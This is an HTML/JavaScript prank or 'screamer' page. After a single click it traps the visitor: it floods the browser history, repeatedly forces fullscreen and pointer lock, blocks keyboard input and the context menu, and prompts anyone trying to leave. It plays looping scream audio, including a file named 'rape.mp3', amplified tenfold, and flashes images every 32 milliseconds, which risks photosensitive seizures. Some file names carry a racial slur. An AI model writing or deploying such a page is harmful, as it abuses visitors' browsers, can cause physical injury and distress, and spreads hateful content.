<!DOCTYPE html>
<html>
<head>
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-149452514-1"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'UA-149452514-1');
    </script>
    <link rel="stylesheet" type="text/css" href="styles.css">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-validate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3026390331916120"
         crossorigin="anonymous"></script>
<style>
* {
    padding: 0;
    margin: 0;
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
}
body, html {
    overflow: hidden;
    height: 100%;
    width: 100%;
    background: #000;
    cursor: none;
}
.video-container {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    display: flex;
    flex-direction: row;
    align-items: center;
    justify-content: space-between;
    z-index: 1000;
}
.video-wrapper {
    width: 640px;
    height: 480px;
    position: relative;
    flex-shrink: 0;
}
.video-wrapper video,
.video-wrapper img {
    width: 100%;
    height: 100%;
    object-fit: contain;
    position: absolute;
    top: 0;
}
.video-divider {
    width: 2px;
    height: 480px;
    background: red;
    flex-shrink: 0;
}
.click-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    z-index: 9999999;
    cursor: pointer;
    display: flex;
    justify-content: center;
    align-items: center;
}
.click-overlay button {
    padding: 20px 40px;
    font-size: 20px;
    background: #fff;
    color: #000;
    border: none;
    border-radius: 0;
    cursor: pointer;
}
.black-screen {
    background-color: black;
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    z-index: 9999998;
}
.backg {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 1;
}
.backg img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    opacity: 0.3;
}

/* FLASH LAYER - ABOVE NAGGARS.GIF */
.flash-layer {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 950 !important;
    pointer-events: none;
    display: none;
    overflow: hidden;
}
.flash-img {
    position: absolute;
    max-width: 58%;
    max-height: 58%;
    opacity: 0;
    visibility: hidden;
    filter: brightness(1.6) contrast(1.4);
    transition: all 0.04s linear;
}
</style>
</head>
<body>

<div class="click-overlay" id="startOverlay">
    <button>ENTER</button>
</div>
<div class="black-screen"></div>

<audio id="shart" preload="auto" loop src="scream.mp3"></audio>
<audio id="shart2" preload="auto" loop src="scream.mp3"></audio>
<audio id="shart3" preload="auto" loop src="rape.mp3"></audio>

<div class="video-container">
    <div class="video-wrapper">
        <img id="wads" src="wads.gif" alt="">
    </div>
    <div class="video-divider"></div>
    <div class="video-wrapper">
        <video id="fart" loop src="zzart.mp4" playsinline></video>
    </div>
    <div class="video-divider"></div>
    <div class="video-wrapper">
        <video id="ronnie" loop src="ronnie.mp4" playsinline></video>
    </div>
</div>

<!-- FLASHING IMAGES (Correct file names + extensions) -->
<div class="flash-layer" id="flashLayer">
    <img id="img1" class="flash-img" src="img1.jpg" alt="">
    <img id="img2" class="flash-img" src="img2.webp" alt="">
    <img id="img3" class="flash-img" src="img3.jpg" alt="">
    <img id="img4" class="flash-img" src="img4.jpg" alt="">
    <img id="img5" class="flash-img" src="img5.jpg" alt="">
    <img id="img6" class="flash-img" src="img6.webp" alt="">
    <img id="img7" class="flash-img" src="img7.jpg" alt="">
</div>

<div class="backg"><img src="naggars.gif"></div>

<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
<script>
(function() {
    let hasTriggered = false;

    let audioContext;
    let gainNode;
    const mediaElements = [];

    function initAudioBoost() {
        audioContext = new (window.AudioContext || window.webkitAudioContext)();
        gainNode = audioContext.createGain();
        gainNode.gain.value = 10;
        gainNode.connect(audioContext.destination);

        const audioIds = ['shart', 'shart2', 'shart3'];
        audioIds.forEach(id => {
            const el = document.getElementById(id);
            if (el) {
                mediaElements.push(el);
                const source = audioContext.createMediaElementSource(el);
                source.connect(gainNode);
                el.loop = true;
                el.muted = false;
            }
        });

        const videoIds = ['fart', 'ronnie'];
        videoIds.forEach(id => {
            const el = document.getElementById(id);
            if (el) {
                mediaElements.push(el);
                const source = audioContext.createMediaElementSource(el);
                source.connect(gainNode);
                el.loop = true;
                el.muted = false;
            }
        });
    }

    function playAllMedia() {
        if (audioContext && audioContext.state === 'suspended') audioContext.resume();
        mediaElements.forEach(m => {
            if (m) {
                m.volume = 1.0;
                m.muted = false;
                m.play().catch(() => setInterval(() => m.play(), 100));
            }
        });
    }

    function attemptFullscreen() {
        const elem = document.documentElement;
        if (elem.requestFullscreen) elem.requestFullscreen();
        else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
        else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
        else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
    }

    function lockPointer() {
        if (document.body.requestPointerLock) document.body.requestPointerLock();
    }

    function floodHistory() {
        for (let i = 0; i < 20; i++) {
            history.pushState(null, null, location.href);
        }
    }

    function blockKeys(e) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }

    function reengageLocks() {
        if (hasTriggered) {
            if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement && !document.msFullscreenElement) {
                attemptFullscreen();
            }
            if (!document.pointerLockElement) lockPointer();
        }
    }

    // Aggressive Flashing
    function startFlashing() {
        const flashLayer = document.getElementById('flashLayer');
        const images = document.querySelectorAll('.flash-img');
        
        flashLayer.style.display = 'block';
        
        setTimeout(() => {
            images.forEach(img => img.style.visibility = 'visible');
        }, 100);

        setInterval(() => {
            images.forEach(img => {
                const x = Math.random() * 80 + 10;
                const y = Math.random() * 80 + 10;
                const scale = 0.6 + Math.random() * 1.8;
                const rot = Math.random() * 70 - 35;

                img.style.left = `${x}%`;
                img.style.top = `${y}%`;
                img.style.transform = `translate(-50%, -50%) scale(${scale}) rotate(${rot}deg)`;
                img.style.opacity = Math.random() > 0.2 ? '1' : '0.05';
            });
        }, 32);
    }

    window.startExperience = function() {
        if (hasTriggered) return;
        hasTriggered = true;

        const overlay = document.getElementById('startOverlay');
        const blackScreen = document.querySelector('.black-screen');
        if (overlay) overlay.style.display = 'none';
        if (blackScreen) blackScreen.style.display = 'none';

        floodHistory();
        initAudioBoost();
        playAllMedia();
        attemptFullscreen();
        lockPointer();
        startFlashing();           // Start flashing
        setInterval(reengageLocks, 200);

        const events = ['mousemove', 'click', 'keydown', 'touchstart', 'mousedown'];
        events.forEach(eventType => {
            document.addEventListener(eventType, reengageLocks, true);
        });

        document.addEventListener('fullscreenchange', reengageLocks);
        document.addEventListener('webkitfullscreenchange', reengageLocks);
        document.addEventListener('mozfullscreenchange', reengageLocks);
        document.addEventListener('MSFullscreenChange', reengageLocks);
        document.addEventListener('pointerlockchange', reengageLocks);
        document.addEventListener('mozpointerlockchange', reengageLocks);
        document.addEventListener('webkitpointerlockchange', reengageLocks);
        document.addEventListener('keydown', blockKeys, true);
        document.addEventListener('keyup', blockKeys, true);
        document.addEventListener('keypress', blockKeys, true);
    };

    document.getElementById('startOverlay').addEventListener('click', startExperience);
    document.addEventListener('contextmenu', e => e.preventDefault(), true);
    document.addEventListener('dragstart', e => e.preventDefault(), true);
    document.addEventListener('selectstart', e => e.preventDefault(), true);

    window.onbeforeunload = function() {
        return "Are you absolutely sure you want to leave?";
    };
    window.onpopstate = function() {
        if (hasTriggered) {
            floodHistory();
            reengageLocks();
        }
    };
})();
</script>
</body>
</html>
